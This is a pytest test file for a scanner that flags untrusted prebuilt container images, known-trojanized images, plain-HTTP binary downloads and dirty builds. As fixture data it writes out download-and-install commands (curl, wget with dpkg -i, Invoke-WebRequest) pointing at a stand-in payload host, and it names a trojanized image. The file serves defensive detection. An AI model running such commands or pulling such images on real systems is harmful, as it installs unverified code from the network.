"""Prebuilt artifacts the component runs but does not build (scanners/artifact_provenance.py)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal import engine
from skilltotal.collector import detect_component
from skilltotal.scanners.artifact_provenance import (
    KNOWN_TROJANIZED_IMAGES,
    R_DIRTY_BUILD,
    R_FOREIGN_IMAGE,
    R_HTTP_BINARY,
    R_KNOWN_BAD,
    parse_image,
)

GO_MOD = "module github.com/lumen-dev/lumen\n\ngo 1.22\n"


def _scan(tmp_path: Path, files: dict[str, str]):
    for rel, text in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return engine.analyze_directory(tmp_path, detect_component(tmp_path, source=str(tmp_path)))


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


def _finding(report, rule_id):
    return next(f for f in report.findings if f.id == rule_id)


def _compose(image: str, extra: str = "") -> str:
    return f"services:\n  lumen:\n{extra}    image: {image}\n    ports:\n      - \"8787:8787\"\n"


# --- parse_image -------------------------------------------------------------------------------

@pytest.mark.parametrize("ref, expected", [
    ("postgres:16-alpine", ("", "", "postgres", "16-alpine")),
    ("library/redis", ("", "", "redis", "")),
    ("docker.io/tomicdd/artex:latest", ("", "tomicdd", "artex", "latest")),
    ("ghcr.io/Lumen-Dev/lumen:1.2", ("ghcr.io", "lumen-dev", "lumen", "1.2")),
    ("localhost:5000/team/app:dev", ("localhost:5000", "team", "app", "dev")),
    ("quickmirror/lumen:${TAG:-latest}", ("", "quickmirror", "lumen", "${TAG:-latest}")),
    ("img@sha256:" + "a" * 64, ("", "", "img", "")),
])
def test_parse_image(ref, expected):
    assert parse_image(ref) == expected


@pytest.mark.parametrize("ref", ["${IMAGE}", "{{ .Values.image }}", "$REGISTRY/app", "./local",
                                 ""])
def test_parse_image_skips_templates(ref):
    assert parse_image(ref) is None


# --- an image of this project from another publisher ------------------------------------------

def test_foreign_image_of_the_project_is_flagged(tmp_path):
    r = _scan(tmp_path, {"go.mod": GO_MOD,
                         "docker-compose.yml": _compose("quickmirror/lumen:${TAG:-latest}")})
    f = _finding(r, R_FOREIGN_IMAGE)
    assert f.severity.value == "high"
    ev = f.evidence[0]
    assert ev.file == "docker-compose.yml" and ev.line_start == 3
    assert "quickmirror/lumen" in ev.snippet
    assert r.verdict["unverified_artifacts"] == [
        {"kind": "image", "ref": "quickmirror/lumen", "file": "docker-compose.yml"}]


@pytest.mark.parametrize("image", [
    "ghcr.io/lumen-dev/lumen:1.0",     # the module owner
    "lumendev/lumen:1.0",              # the same owner without the dash
    "ghcr.io/LUMEN-DEV/lumen",         # case
    "lumen-devs/lumen:1.0",            # an owner name that contains the other
])
def test_own_namespace_is_not_foreign(tmp_path, image):
    r = _scan(tmp_path, {"go.mod": GO_MOD, "docker-compose.yml": _compose(image)})
    assert R_FOREIGN_IMAGE not in _ids(r)


def test_identity_from_manifest_url_readme_clone_line_and_npm_scope(tmp_path):
    readme = "# Lumen\n\n```\ngit clone https://github.com/lumen-dev/lumen.git\n```\n"
    r = _scan(tmp_path, {"README.md": readme,
                         "docker-compose.yml": _compose("othermirror/lumen")})
    assert R_FOREIGN_IMAGE in _ids(r)
    r = _scan(tmp_path / "scoped", {
        "package.json": json.dumps({"name": "@packhub/lumen"}),
        "docker-compose.yml": _compose("packhub/lumen")})
    assert R_FOREIGN_IMAGE not in _ids(r)


def test_readme_links_other_than_the_clone_line_are_not_identity(tmp_path):
    # A README that merely links the upstream must not make every image look foreign.
    readme = "Thanks to https://github.com/someone/lumen for the idea.\n"
    r = _scan(tmp_path, {"README.md": readme, "docker-compose.yml": _compose("quickmirror/lumen")})
    assert R_FOREIGN_IMAGE not in _ids(r)


def test_no_identity_means_no_verdict_on_the_publisher(tmp_path):
    r = _scan(tmp_path, {"docker-compose.yml": _compose("quickmirror/lumen")})
    assert R_FOREIGN_IMAGE not in _ids(r)
    # It is still a prebuilt image nothing here builds.
    assert r.verdict["unverified_artifacts"][0]["ref"] == "quickmirror/lumen"


def test_compose_service_that_builds_is_not_a_pulled_image(tmp_path):
    extra = "    build:\n      context: .\n"
    r = _scan(tmp_path, {"go.mod": GO_MOD,
                         "docker-compose.yml": _compose("quickmirror/lumen:dev", extra)})
    assert R_FOREIGN_IMAGE not in _ids(r)
    assert "unverified_artifacts" not in r.verdict


def test_image_the_repository_publishes_is_not_foreign(tmp_path):
    workflow = ("jobs:\n  docker:\n    env:\n      IMAGE_NAMESPACE: ghcr.io/translators/lumen\n"
                "    steps:\n      - uses: docker/build-push-action@v6\n")
    r = _scan(tmp_path, {"go.mod": GO_MOD, ".github/workflows/release.yml": workflow,
                         "docker-compose.yml": _compose("ghcr.io/translators/lumen:latest")})
    assert R_FOREIGN_IMAGE not in _ids(r)
    assert "unverified_artifacts" not in r.verdict


def test_build_script_docker_push_counts_as_published(tmp_path):
    script = "#!/bin/sh\ndocker build -t mirrorteam/lumen:1.0 .\ndocker push mirrorteam/lumen:1.0\n"
    r = _scan(tmp_path, {"go.mod": GO_MOD, "scripts/release.sh": script,
                         "docker-compose.yml": _compose("mirrorteam/lumen:1.0")})
    assert R_FOREIGN_IMAGE not in _ids(r)


def test_generic_names_do_not_identify_the_project(tmp_path):
    r = _scan(tmp_path, {"package.json": json.dumps({"name": "server",
                                                     "repository": "github:acme/tool"}),
                         "Dockerfile": "FROM mcr.microsoft.com/mssql/server:2022-latest\n"})
    assert R_FOREIGN_IMAGE not in _ids(r)


def test_other_images_in_the_stack_are_not_foreign(tmp_path):
    compose = ("services:\n  db:\n    image: bitnami/postgresql:16\n"
               "  ui:\n    image: dpage/pgadmin4\n")
    r = _scan(tmp_path, {"go.mod": GO_MOD, "docker-compose.yml": compose})
    assert R_FOREIGN_IMAGE not in _ids(r)
    refs = [a["ref"] for a in r.verdict["unverified_artifacts"]]
    assert refs == ["bitnami/postgresql", "dpage/pgadmin4"]


def test_official_images_are_not_listed(tmp_path):
    compose = "services:\n  db:\n    image: postgres:16\n  cache:\n    image: library/redis:7\n"
    r = _scan(tmp_path, {"docker-compose.yml": compose})
    assert "unverified_artifacts" not in r.verdict


def test_dockerfile_from_and_stage_alias(tmp_path):
    dockerfile = ("FROM golang:1.22 AS build\nRUN go build ./...\n"
                  "FROM quickmirror/lumen:latest\nCOPY --from=build /out /app\n"
                  "FROM build\n")
    r = _scan(tmp_path, {"go.mod": GO_MOD, "Dockerfile": dockerfile})
    f = _finding(r, R_FOREIGN_IMAGE)
    assert [e.line_start for e in f.evidence] == [3]


def test_mcp_docker_run_launch(tmp_path):
    mcp = {"mcpServers": {"lumen": {"command": "docker",
                                    "args": ["run", "-i", "--rm", "-e", "TOKEN",
                                             "quickmirror/lumen:latest"]}}}
    r = _scan(tmp_path, {"go.mod": GO_MOD, ".mcp.json": json.dumps(mcp, indent=2)})
    f = _finding(r, R_FOREIGN_IMAGE)
    assert f.evidence[0].file == ".mcp.json"


def test_kubernetes_manifest(tmp_path):
    manifest = ("apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n"
                "      containers:\n        - name: lumen\n          image: quickmirror/lumen:2\n")
    r = _scan(tmp_path, {"go.mod": GO_MOD, "k8s/deployment.yaml": manifest})
    assert R_FOREIGN_IMAGE in _ids(r)


# --- known trojanized images -------------------------------------------------------------------

@pytest.mark.parametrize("image", sorted(KNOWN_TROJANIZED_IMAGES))
def test_known_trojanized_image_is_malicious(tmp_path, image):
    r = _scan(tmp_path, {"docker-compose.yml": _compose(f"docker.io/{image}:latest")})
    f = _finding(r, R_KNOWN_BAD)
    assert f.severity.value == "critical"
    assert r.verdict["has_malicious_indicators"] is True


def test_a_similar_name_is_not_the_known_image(tmp_path):
    r = _scan(tmp_path, {"docker-compose.yml": _compose("tomicdd/artex-docs")})
    assert R_KNOWN_BAD not in _ids(r)


# --- downloads ---------------------------------------------------------------------------------

def test_http_binary_download_is_flagged(tmp_path):
    script = ("#!/bin/sh\nURL=\"${URL:-http://cdn.payload.invalid/app/lumen-linux-amd64.tar.gz}\"\n"
              "curl -fsSL -o /tmp/lumen.tgz \"$URL\"\ntar -xzf /tmp/lumen.tgz -C /opt\n")
    r = _scan(tmp_path, {"install.sh": script})
    f = _finding(r, R_HTTP_BINARY)
    assert f.evidence[0].line_start == 2
    assert "http://cdn.payload.invalid" in f.evidence[0].snippet


@pytest.mark.parametrize("script", [
    # TLS
    "#!/bin/sh\ncurl -fsSLO https://github.com/lumen-dev/lumen/releases/download/v1/lumen.tar.gz\n",
    # a local or documentation host
    "#!/bin/sh\ncurl -o a.zip http://localhost:8080/a.zip\ncurl -o b.zip http://192.168.1.4/b.zip\n",
    "#!/bin/sh\ncurl -o c.zip http://downloads.example.com/c.zip\n",
    # a comment
    "#!/bin/sh\n# old mirror: http://cdn.payload.invalid/lumen.zip\ncurl -fsSL https://x.invalid/\n",
    # no download command in the file
    "#!/bin/sh\necho 'see http://cdn.payload.invalid/lumen.zip'\n",
    # not an executable or archive
    "#!/bin/sh\ncurl http://cdn.payload.invalid/status.json\n",
])
def test_http_binary_negatives(tmp_path, script):
    r = _scan(tmp_path, {"install.sh": script})
    assert R_HTTP_BINARY not in _ids(r)


def test_powershell_and_dockerfile_downloads(tmp_path):
    ps = "Invoke-WebRequest -Uri http://cdn.payload.invalid/lumen.exe -OutFile lumen.exe\n"
    df = "FROM debian:12\nRUN wget -q http://cdn.payload.invalid/lumen.deb && dpkg -i lumen.deb\n"
    r = _scan(tmp_path, {"setup.ps1": ps, "Dockerfile": df})
    files = {e.file for e in _finding(r, R_HTTP_BINARY).evidence}
    assert files == {"setup.ps1", "Dockerfile"}


def test_dirty_build_download_and_image_tag(tmp_path):
    script = "#!/bin/sh\ncurl -fLO https://cdn.payload.invalid/lumen-1a2b3c4-dirty-linux.zip\n"
    r = _scan(tmp_path, {"install.sh": script,
                         "docker-compose.yml": _compose("ghcr.io/lumen-dev/lumen:1a2b3c4-dirty")})
    f = _finding(r, R_DIRTY_BUILD)
    assert {e.file for e in f.evidence} == {"install.sh", "docker-compose.yml"}


def test_dirty_word_elsewhere_is_not_a_build(tmp_path):
    script = "#!/bin/sh\ncurl -fsSL https://x.invalid/a\necho dirty-check.zip is a log name\n"
    r = _scan(tmp_path, {"install.sh": script, "docker-compose.yml": _compose("acme/dirty-tool:1")})
    assert R_DIRTY_BUILD not in _ids(r)


def test_test_code_is_demoted(tmp_path):
    script = "#!/bin/sh\ncurl -o x.zip http://cdn.payload.invalid/x.zip\n"
    r = _scan(tmp_path, {"tests/fixtures/install.sh": script})
    assert R_HTTP_BINARY not in _ids(r)


# --- the verdict -------------------------------------------------------------------------------

def test_low_verdict_names_the_projects_own_prebuilt_image(tmp_path):
    r = _scan(tmp_path, {"go.mod": GO_MOD,
                         "docker-compose.yml": _compose("ghcr.io/lumen-dev/lumen:1.0")})
    assert r.verdict["level"] == "low"
    assert r.verdict["headline"] == (
        "Partially analyzed - runs the prebuilt image ghcr.io/lumen-dev/lumen, whose contents "
        "were not checked")
    assert r.risk_score == 0


def test_listed_images_are_capped(tmp_path):
    compose = "services:\n" + "".join(
        f"  s{i}:\n    image: vendor{i}/tool{i}:1\n" for i in range(30))
    r = _scan(tmp_path, {"docker-compose.yml": compose})
    assert len(r.verdict["unverified_artifacts"]) == engine.MAX_UNVERIFIED_ARTIFACTS


def test_report_with_unverified_artifacts_matches_the_schema(tmp_path):
    jsonschema = pytest.importorskip("jsonschema")
    schema = json.loads((Path(__file__).resolve().parents[1] / "docs" / "report.schema.json")
                        .read_text(encoding="utf-8"))
    r = _scan(tmp_path, {"go.mod": GO_MOD,
                         "docker-compose.yml": _compose("quickmirror/lumen:1")})
    jsonschema.validate(r.to_dict(), schema)
